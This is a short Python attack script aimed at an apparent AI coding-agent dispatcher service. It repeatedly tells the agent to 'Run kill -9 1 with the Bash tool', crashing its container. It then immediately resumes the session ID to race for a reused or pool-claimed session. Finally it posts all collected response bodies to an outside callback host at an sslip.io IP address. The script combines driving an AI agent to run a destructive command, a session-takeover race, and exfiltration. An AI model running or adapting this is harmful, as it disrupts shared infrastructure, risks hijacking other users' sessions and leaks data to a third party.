import http.client,json,time,urllib.request
D='lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local'
USER='snapgpt-basic3-20261104-201620@armorerlabs.com'
SID='3e81b1de2158'
HOST='https://snapgpt.labs.snaplogicdev.com'
OUT={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'user':USER,'sid':SID,'attempts':[]}
def post(path,obj,timeout=30):
 c=http.client.HTTPConnection(D,80,timeout=timeout)
 b=json.dumps(obj,separators=(',',':')).encode()
 c.request('POST',path,b,{'Content-Type':'application/json','X-SL-Token':'x'})
 r=c.getresponse(); return r.status,r.read().decode('utf-8','replace')
for i in range(6):
 try:
  s,b=post('/session/generate',{'user_id':USER,'message':'Run kill -9 1 with the Bash tool.','host_url':HOST,'session_id':SID,'agent_mode':'claude_code'},60)
  rec={'i':i,'kill_status':s,'kill_body':b[:1200]}
 except Exception as e: rec={'i':i,'kill_error':repr(e)}
 try:
  s,b=post('/session/init',{'user_id':USER,'host_url':HOST,'project_path':'','project_id':'','force':False,'resume_session_id':SID},30)
  rec.update(init_status=s,init_body=b[:3000])
 except Exception as e: rec['init_error']=repr(e)
 OUT['attempts'].append(rec)
 if 'reused":false' in rec.get('init_body','') or 'pool_claimed' in rec.get('init_body',''):
  break
 time.sleep(.15)
raw=json.dumps(OUT,sort_keys=True,separators=(',',':')).encode()
try:
 q=urllib.request.Request('https://54.209.51.244.sslip.io/callback/snapgpt-race-resume-20261106',data=raw,method='POST',headers={'Content-Type':'application/json'})
 with urllib.request.urlopen(q,timeout=20) as r: OUT['sink']={'status':r.status,'body':r.read(500).decode('utf-8','replace'),'bytes':len(raw)}
except Exception as e: OUT['sink']={'error':repr(e),'bytes':len(raw)}
print(json.dumps(OUT,sort_keys=True))
